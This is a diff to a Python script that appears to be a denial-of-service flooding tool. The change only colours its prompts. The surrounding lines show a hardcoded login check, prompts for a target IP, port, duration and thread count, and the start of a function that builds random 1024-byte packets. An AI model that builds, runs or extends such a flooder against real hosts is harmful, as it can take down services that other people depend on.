@@ -49,8 +49,8 @@ logo = """
 faded_text = fade.fire(logo)
 print(faded_text)
 while attemps < 100:
-    username = input('Enter your username: ')
-    password = input('Enter your password: ')
+    username = input("\033[33mEnter your username: \033[0m")
+    password = input("\033[32mEnter your password: \033[0m")
 
     if username == '6453' and password == '6453':
         print('Selamat datang di zona BASE!!')
@@ -63,11 +63,11 @@ os.system("clear")
 
 
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
-choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
+ip = str(input("\033[37m Target IP : \033[0m"))
+port = int(input("\033[36m Target Port : \033[0m"))
+choice = str(input("\033[35m (y/n) : \033[0m"))
+times = int(input("\033[34m Time : \033[0m"))
+threads = int(input("\033[33m Threads : \033[0m"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
